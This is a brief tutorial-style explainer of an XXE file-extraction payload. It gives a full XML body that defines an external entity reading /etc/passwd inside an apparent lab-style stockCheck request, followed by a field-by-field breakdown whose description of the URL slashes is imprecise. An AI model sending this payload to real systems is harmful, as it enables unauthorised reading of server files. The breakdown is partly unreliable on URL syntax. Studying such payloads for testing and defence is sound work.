
## **XXE File Extraction Payload**

### **The XML Payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

```

### **Breakdown**

This payload defines the external entity `&xxe;`, which pulls the contents of `/etc/passwd` into the request.

* **`file://`** — The protocol handler.
* Third `/` — Represents the host (usually omitted for local files).
* **`etc/passwd`** — The absolute path to the target file.
* **`<stockCheck><productId>`** — The original structure of the application's request.

> 
> **`xxe`** is just a placeholder name; you can replace it with any string.


